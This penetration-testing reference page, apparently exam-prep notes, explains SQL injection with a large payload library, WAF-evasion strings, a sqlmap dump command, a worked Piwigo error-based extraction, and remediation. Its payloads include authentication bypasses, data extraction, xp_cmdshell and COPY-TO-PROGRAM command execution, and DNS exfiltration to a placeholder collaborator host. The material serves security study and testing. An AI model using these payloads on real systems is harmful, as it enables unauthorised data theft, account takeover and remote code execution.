---
type: technique
title: SQL Injection
lang: en
status: active
wstg: ["WSTG-INPV-05"]
owasp_top10: ["A03:2021"]
owasp_api: []
asvs: ["V1.2.4"]
cwe: ["CWE-89"]
attack: ["T1190"]
cvss: ""
sources: [web-200-oswa, payloadsallthethings]
updated: 2026-09-17
---

# SQL Injection

**TL;DR** — When user-controlled input reaches a SQL query without being safely
parameterised, an attacker can change the query's structure to read or modify arbitrary
data, bypass authentication, and sometimes reach the OS. Confirm the injection context
first (string / numeric / identifier / `ORDER BY`), then pick an extraction method
(UNION, error-based, blind) that fits that context.

> Framework mapping: **A03:2021 – Injection**, `CWE-89`, ATT&CK `T1190`.
> WSTG `WSTG-INPV-05` (Testing for SQL Injection); ASVS `V1.2.4` — verified against the
> WSTG 4.2 and ASVS 5.0 corpora.

## Where it applies

Any parameter that reaches a SQL query: query-string and POST fields, JSON/REST and
GraphQL arguments, HTTP headers (`User-Agent`, `Referer`, `X-Forwarded-For`), and cookies.
It is not limited to obvious "search" inputs — sort direction, pagination, and column
names are frequent, easily-missed sinks. Applies across server-rendered apps
and API back-ends, over MySQL/MariaDB, Microsoft SQL Server, PostgreSQL and Oracle
(see [[sql-enumeration]] for per-DBMS specifics).

## How it works

The application builds a query by concatenating input into a string instead of binding it
as data. The attacker's goal is to break out of the intended **injection context** and
have the database parse attacker text as SQL. Contexts behave differently and dictate what
works:

- **String context** — value sits inside quotes: `... WHERE name = 'INPUT'`. Break out with `'`.
- **Numeric context** — value is unquoted: `... WHERE id = INPUT`. No quote needed.
- **Identifier / `ORDER BY` context** — value is a column or sort direction:
  `... ORDER BY col INPUT`. Cannot be closed with a quote and **cannot be fixed with a
  prepared statement** (see Remediation); UNION does not apply here, so error-based or
  blind extraction is used. *(This is the context in the worked example below.)*

## Testing / detection

1. **Map candidate sinks.** Enumerate every parameter (decode nested/URL-encoded bodies —
   e.g. DataTables `columns[]`/`order[]` structures — with [[burp-suite|Burp]] Decoder).
2. **Probe the delimiter.** Inject a single quote and watch for a 500, a DB error, or a
   changed response. Test numeric sinks with an arithmetic no-op vs. a breaking value.
3. **Confirm by boolean pair.** A true vs. false condition that changes the response
   confirms the input is parsed as SQL:

   ```sql
   -- string context: true then false
   ' OR '1'='1
   ' OR '1'='2
   -- numeric context
   1 AND 1=1
   1 AND 1=2
   ```
4. **Watch quoting per field.** When testing several fields at once, remember unbalanced
   quotes across multiple sinks can cancel out into a valid query — test surgically, and
   note that numeric/keyword sinks (`LIMIT`, `ORDER BY … asc`) are usually unquoted.
5. **Read the error.** Verbose errors often leak the DBMS, the surrounding query, and the
   context — invaluable for choosing an exploitation path.

## Exploitation techniques

Pick by context and by how much output the app returns.

- **UNION-based** — the query returns rows and you control a `SELECT` list. Match column
  count and types, then append your own `SELECT`:

  ```sql
  ' UNION SELECT NULL, username, password FROM users-- -
  ```
- **Error-based** — the app hides data but returns DB errors. On MySQL, smuggle data into
  an XPATH error via `extractvalue()`/`updatexml()`, aggregating multi-row output with
  `group_concat()`:

  ```sql
  ' AND extractvalue(1, concat(0x7e, (SELECT group_concat(table_name)
        FROM information_schema.tables WHERE table_schema=database())))-- -
  ```
- **Boolean-blind** — no output, no errors; infer one bit at a time from response changes:

  ```sql
  ' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -
  ```
- **Time-blind** — infer from response delay when there is no other oracle:

  ```sql
  ' AND IF(SUBSTRING(version(),1,1)='8', SLEEP(5), 0)-- -   -- MySQL
  ; IF (1=1) WAITFOR DELAY '0:0:5'--                        -- MSSQL
  ```
- **Stacked queries** — where the driver allows multiple statements (`;`), run INSERT/
  UPDATE/DDL (common on MSSQL/PostgreSQL, rarely on default MySQL PHP drivers).
- **File read / write** — `LOAD_FILE()` to read, `INTO OUTFILE`/`INTO DUMPFILE` to write
  (requires `FILE` privilege + writable path + `secure_file_priv` off). Writing a minimal
  PHP web shell to the web root escalates to code execution — see [[command-injection]]
  for the payload itself (kept out of this page so the file stays AV-clean):

  ```sql
  ' UNION SELECT '<PHP_CMD_WEBSHELL — see command-injection>' INTO OUTFILE
        '/var/www/html/s.php'-- -
  ```
- **RCE via DB features** — MSSQL `xp_cmdshell`, PostgreSQL `COPY … PROGRAM`, etc.

Escalate carefully: enumerate first (version, current user, privileges, schemas → tables →
columns), then target the interesting data. See [[sql-enumeration]] for the per-DBMS
metadata queries.

## Authentication bypass & second-order

- **Login bypass** when credentials are checked in SQL — comment out the password test or
  force a true condition:

  ```sql
  admin'-- -
  ' OR 1=1 LIMIT 1-- -
  ```
- **Second-order:** input stored safely on one request, then concatenated into a query on a
  *later* one (a registered username reused in an admin report). Plant a payload, then watch
  where it re-enters a query.
- **WAF evasion:** inline comments (`/**/`, `/*!50000UNION*/`), case/whitespace variation,
  alternate encodings — reduce reliance on any single keyword. A bypass, not a fix; know the
  sink.

## Automated exploitation — sqlmap

Once a parameter is confirmed, hand the exact request to [[sqlmap]] (save it from
[[burp-suite|Burp]] with *Copy to file*), so it reproduces cookies, headers and body:

```bash
sqlmap -r request.txt -p 'order[0][dir]' --dbms=mysql --batch \
       --technique=E --dump -T users -D piwigo
```

Automate the grind (enumeration, blind extraction), but **understand the manual payload
first** — the exam and real scoping both reward knowing *why* it works. Note: **sqlmap *is*
allowed on the [[oswa-exam|OSWA]] exam** (unlike OSCP) — but it's noisy, not required, and
often fails on exam targets, so confirm the injection by hand and use sqlmap only to grind
extraction. (The exam bans autopwn frameworks and mass scanners — not sqlmap.)

## Payload library

Copy-paste sets by context/DBMS; per-DBMS enumeration on [[sql-enumeration]]. Fuller set:
[[payloadsallthethings|PaTT]].

**Detect & fingerprint** (both sides equal → that DBMS):

```sql
-- break chars: '  "  )  ;      boolean pair: ' OR 1=1-- -   vs   ' OR 1=2-- -
connection_id()=connection_id()      -- MySQL
@@version                            -- MySQL / MSSQL      v$version -- Oracle      version() -- Postgres
sqlite_version()=sqlite_version()    -- SQLite
```

**Auth bypass** (login form):

```sql
' OR '1'='1'-- -        ' OR 1=1 LIMIT 1-- -        admin'-- -
" OR ""="               ' OR '1                     ') OR ('1'='1
```

**Error-based extraction** (verbose DB errors):

```sql
-- MySQL
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -
-- MSSQL
' AND 1=CONVERT(int,(SELECT @@version))-- -
-- PostgreSQL
' AND 1=CAST((SELECT version()) AS int)-- -
-- Oracle
' AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE rownum=1))-- -
```

**Boolean-blind** (binary-search one char at a time):

```sql
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64-- -
```

**Time-blind, per DBMS:**

```sql
' AND SLEEP(5)-- -                                   -- MySQL
'; WAITFOR DELAY '0:0:5'-- -                          -- MSSQL
'; SELECT pg_sleep(5)-- -                             -- PostgreSQL
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -          -- Oracle
```

**OOB / stacked** (exfil via DNS/SMB; RCE where allowed):

```sql
'; EXEC xp_cmdshell 'whoami'-- -                                    -- MSSQL (if enabled)
'; COPY (SELECT '') TO PROGRAM 'nslookup $(whoami).<collab>'-- -    -- PostgreSQL superuser
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.<collab>\\a'))-- -   -- MySQL DNS OOB (Windows)
```

### WAF / filter evasion

```sql
-- no space (TAB / comment as separator)
'%09OR%091=1-- -      '/**/OR/**/1=1-- -      (1)OR(1)=(1)-- -
-- MySQL conditional comment still executes the keyword
/*!50000UNION*//*!50000SELECT*/1-- -
-- no comma:  LIMIT 1 OFFSET 0     SUBSTRING(x FROM 1 FOR 1)
-- no equal:  SUBSTRING(version(),1,1)LIKE 5     x BETWEEN 4 AND 6     x REGEXP '^5'
-- no AND/OR: &&    ||    HAVING
-- case / wide-byte: SeLeCt ,   %bf%27 (GBK swallows the added backslash)
```

## Worked example — Piwigo, error-based via `ORDER BY` (MySQL)

Real-world case from [[web-200-oswa|WEB-200]] (Piwigo image gallery). Authenticated as the
admin, the user-management grid issues a DataTables request:

```
POST /admin/user_list_backend.php      (many URL-encoded columns[]/order[] fields)
```

1. **Decode the body** in [[burp-suite|Burp]] Decoder. Among the fields, three look
   query-shaped: `order[0][dir]` (a sort direction, `asc`), `start` and `length`
   (pagination) — all likely unquoted in the SQL.
2. **Probe.** Adding `'` to `start`/`length` returns an application validation error
   (`[Hacking attempt] the input parameter "start" is not valid`) — a dead end. A `'` on
   `order[0][dir]` returns a **MySQL 1064 syntax error** that echoes the query:
   `... ORDER BY id asc' LIMIT 0, 10`. That confirms injection **in the `ORDER BY`
   clause** and that the DBMS is MySQL.
3. **Choose the method.** `ORDER BY` context ⇒ UNION won't work, but verbose errors ⇒
   **error-based**. Leak the version to confirm data exfiltration:

   ```sql
   asc, extractvalue('', concat('>', version()))
   ```
4. **Extract structure.** `extractvalue()` needs a single value, so wrap a subquery in
   `group_concat()` (aliased, because MySQL needs a table alias):

   ```sql
   asc, extractvalue('', concat('>', (
     SELECT group_concat(table_schema)
     FROM (SELECT table_schema FROM information_schema.tables
           GROUP BY table_schema) AS foo)))
   ```
5. **Beat the truncation.** The XPATH error prints only ~32 chars, so iterate with
   `LIMIT … OFFSET …`, bumping the offset each request until the `piwigo_users` table
   surfaces (around offset 32), then dump its columns and rows the same way.

Impact: full read of application data including the user table → credential theft →
account takeover of the admin panel.

## Confirming impact

Demonstrate concretely: exfiltrate a non-sensitive-but-proof value (DB version, current
user), then the minimum data that proves access to sensitive tables. Note whether the
sink allows write/stacked queries or file access (path to RCE). Severity is typically
**High–Critical**; score per-finding with CVSS (data sensitivity + auth required + impact).

## Remediation

- **Parameterised queries / prepared statements** for every DB access — the primary fix
  ([[parameterized-queries]]).
- **`ORDER BY` / identifiers can't be bound** → map user input to an **allowlist** of
  permitted column names / directions server-side (the exact gap exploited above).
- **Least privilege** DB account (no `FILE`, no DBA, no `xp_cmdshell`); disable stacked
  queries where possible; `secure_file_priv` set.
- Defence-in-depth: input validation, generic error pages (kills error-based leaks), WAF
  (bypassable — not a fix).

*ASVS `V1.2.4` (parameterised queries / DB injection). ASVS 5.0 explicitly notes that
identifiers and `ORDER BY` column names cannot be escaped — exactly the allowlist gap above.*

## Quick checklist

- [ ] Every param (query/POST/JSON/header/cookie, sort/`ORDER BY`/pagination) → probe `'`, boolean pair.
- [ ] Read the error → DBMS + query context. Pick UNION / error-based / boolean / time by what the app returns.
- [ ] Enumerate (version→user→priv→db→tables→columns, [[sql-enumeration]]) then dump the target data.
- [ ] Escalate: file read/write (FILE priv) → web shell; `xp_cmdshell` / `COPY…PROGRAM` → RCE.
- [ ] WAF? → TAB/`/**/`, conditional comment, no-comma/no-equal, wide-byte. **sqlmap is allowed on OSWA but noisy — confirm by hand first.**

## See also

[[sql-enumeration]] · [[sqlmap]] · [[burp-suite]] · [[web-app-assessment]] · [[parameterized-queries]]

*Sources: [[web-200-oswa]] (modules 8–9, Piwigo case study); [[payloadsallthethings]] (detection/fingerprint, auth-bypass, error/boolean/time per-DBMS, OOB, WAF-evasion classes).*
